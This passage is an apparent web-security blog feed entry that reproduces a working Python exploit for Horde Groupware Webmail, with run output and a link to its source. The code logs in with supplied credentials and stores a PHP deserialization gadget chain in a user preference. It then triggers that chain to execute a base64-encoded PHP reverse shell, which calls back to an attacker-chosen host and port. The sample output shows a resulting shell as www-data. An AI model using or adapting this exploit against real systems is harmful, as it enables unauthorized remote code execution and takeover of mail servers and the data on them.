172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string">(+) targeting http://172.16.175.145/horde/</span></span><br><span class="line"><span class="string">(+) obtained session iefankvohbl8og0mtaadm3efb6</span></span><br><span class="line"><span class="string">(+) inserted our php object</span></span><br><span class="line"><span class="string">(+) triggering deserialization...</span></span><br><span class="line"><span class="string">(+) starting handler on port 1337</span></span><br><span class="line"><span class="string">(+) connection from 172.16.175.145</span></span><br><span class="line"><span class="string">(+) pop thy shell!</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www/horde/services</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">exit</span></span><br><span class="line"><span class="string">*** Connection closed by remote host ***</span></span><br><span class="line"><span class="string">(+) repaired the target!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rs</span>(<span class="params">cbh, cbp</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;@error_reporting(-1);</span></span><br><span class="line"><span class="string">@set_time_limit(0); </span></span><br><span class="line"><span class="string">@ignore_user_abort(1);</span></span><br><span class="line"><span class="string">$dis=@ini_get(&#x27;disable_functions&#x27;);</span></span><br><span class="line"><span class="string">if(!empty($dis))&#123;</span></span><br><span class="line"><span class="string">    $dis=preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=explode(&#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=array_map(&#x27;trim&#x27;, $dis);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">    $dis=array();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$ipaddr=&#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">$port=%d;</span></span><br><span class="line"><span class="string">function PtdSlhY($c)&#123;</span></span><br><span class="line"><span class="string">    global $dis; </span></span><br><span class="line"><span class="string">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27; )) &#123;</span></span><br><span class="line"><span class="string">        $c=$c.&quot; 2&gt;&amp;1\\n&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ob_start();</span></span><br><span class="line"><span class="string">    system($c);</span></span><br><span class="line"><span class="string">    $o=ob_get_contents();</span></span><br><span class="line"><span class="string">    ob_end_clean();</span></span><br><span class="line"><span class="string">    if (strlen($o) === 0)&#123;</span></span><br><span class="line"><span class="string">        $o = &quot;NULL&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return $o;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$nofuncs=&#x27;no exec functions&#x27;;</span></span><br><span class="line"><span class="string">$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);</span></span><br><span class="line"><span class="string">while($c=fread($s,2048))&#123;</span></span><br><span class="line"><span class="string">    $out = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">    if(substr($c,0,3) == &#x27;cd &#x27;)&#123;</span></span><br><span class="line"><span class="string">        chdir(substr($c,3,-1));</span></span><br><span class="line"><span class="string">    &#125;else if (substr($c,0,4) == &#x27;quit&#x27; || substr($c,0,4) == &#x27;exit&#x27;) &#123;</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        $out=PtdSlhY(substr($c,0,-1));</span></span><br><span class="line"><span class="string">        if($out===false)&#123;</span></span><br><span class="line"><span class="string">            fwrite($s, $nofuncs);</span></span><br><span class="line"><span class="string">            break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    fwrite($s,$out);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">fclose($s);&quot;&quot;&quot;</span> % (cbh, cbp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session</span>(<span class="params">t, p, usr, pwd</span>):</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%slogin.php&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;login_post&quot;</span> : <span class="number">1337</span>,</span><br><span class="line">        <span class="string">&quot;horde_user&quot;</span> : usr,</span><br><span class="line">        <span class="string">&quot;horde_pass&quot;</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(uri, data=p, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    match = re.findall(<span class="string">&quot;Horde=(.&#123;26&#125;);&quot;</span>, r.headers[<span class="string">&#x27;set-cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">assert</span> len(match) == <span class="number">2</span>, <span class="string">&quot;(-) failed to login&quot;</span></span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_deserialization</span>(<span class="params">t, p, s, host, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span></span><br><span class="line">    handlerthr = Thread(target=handler, args=(port,))</span><br><span class="line">    handlerthr.start()</span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/imple&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;imple&quot;</span> : <span class="string">&quot;IMP_Prefs_Sort&quot;</span>,</span><br><span class="line">        <span class="string">&quot;app&quot;</span> : <span class="string">&quot;imp&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    h = &#123; <span class="string">&quot;cmd&quot;</span> : base64.b64encode(rs(host, port).encode()) &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">&quot;(-) failed to trigger deserialization!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pop</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span></span><br><span class="line">    pop  = <span class="string">&#x27;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#x27;</span>  <span class="comment"># implements Serializable using custom unserialize/serialize</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span>             <span class="comment"># additional checks</span></span><br><span class="line">    pop += <span class="string">&#x27;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_patch</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Our original array &quot;&quot;&quot;</span></span><br><span class="line">    patch  = <span class="string">&#x27;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:5:&quot;INBOX&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:1:&quot;b&quot;;i:6;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> patch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_pref</span>(<span class="params">t, p, s, k, o</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;pref&quot;</span> : k,</span><br><span class="line">        <span class="string">&quot;value&quot;</span> : o,</span><br><span class="line">    &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="string">&quot;\&quot;response\&quot;:true&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>), <span class="string">&quot;(-) failed to set the preference!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">lport</span>):</span></span><br><span class="line">    print(<span class="string">&quot;(+) starting handler on port %d&quot;</span> % lport)</span><br><span class="line">    t = telnetlib.Telnet()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">&quot;0.0.0.0&quot;</span>, lport))</span><br><span class="line">    s.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print(<span class="string">&quot;(+) connection from %s&quot;</span> % addr[<span class="number">0</span>])</span><br><span class="line">    t.sock = conn</span><br><span class="line">    print(<span class="string">&quot;(+) pop thy shell!&quot;</span>)</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_path</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;/%s&quot;</span> % p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;%s/&quot;</span> % p</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    path   = fix_path(sys.argv[<span class="number">2</span>])</span><br><span class="line">    user   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    pswd   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    host   = sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port   = int(sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">&quot;(+) targeting http://%s%s&quot;</span> % (target, path))</span><br><span class="line">    session = get_session(target, path, user, pswd)</span><br><span class="line">    print(<span class="string">&quot;(+) obtained session %s&quot;</span> % session)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_pop())</span><br><span class="line">    print(<span class="string">&quot;(+) inserted our php object&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;(+) triggering deserialization...&quot;</span>)</span><br><span class="line">    trigger_deserialization(target, path, session, host, port)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_patch())</span><br><span class="line">    print(<span class="string">&quot;(+) repaired the target!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">saturn:~$.&#x2F;poc.py 172.16.175.148&#x2F;horde&#x2F; hordeuser:pass123 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line"></span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6</span><br><span class="line"></span><br><span class="line">(+) inserted our php object</span><br><span class="line"></span><br><span class="line">(+) triggering deserialization...</span><br><span class="line"></span><br><span class="line">(+) starting handler on port 1337</span><br><span class="line"></span><br><span class="line">(+) connection from 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) pop thy shell!</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://srcincite.io/pocs/zdi-20-1051.py.txt">https://srcincite.io/pocs/zdi-20-1051.py.txt</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Python Exp：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Horde Groupware Webmail Edition" scheme="http://www.ol4three.com/tags/Horde-Groupware-Webmail-Edition/"/>
    
  </entry>
  
</feed>
